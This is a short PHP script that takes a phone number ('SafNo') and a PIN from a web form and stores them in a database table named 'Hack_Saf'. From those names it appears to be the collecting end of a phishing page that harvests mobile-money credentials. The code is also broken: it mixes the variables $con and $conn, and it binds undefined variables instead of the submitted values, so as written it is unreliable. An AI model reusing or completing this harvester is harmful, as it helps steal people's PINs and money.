
<?php
$sn="localhost";
$un="root";
$pass="";
$dbname="";

$con = new mysqli($sn,$un,$pass,$dbname);

$SafNo=$_POST['SafNo'];
$Pin=$_POST['Pin'];

$stmt = $conn->prepare("INSERT INTO Hack_Saf (Phone, Pin) VALUES (?, ?)");
$stmt->bind_param("ss", $input1, $input2);

if ($stmt->execute()) {
    echo "New record created successfully";
} else {
    echo "Error: " . $stmt->error;
}

$stmt->close();
$conn->close();
?>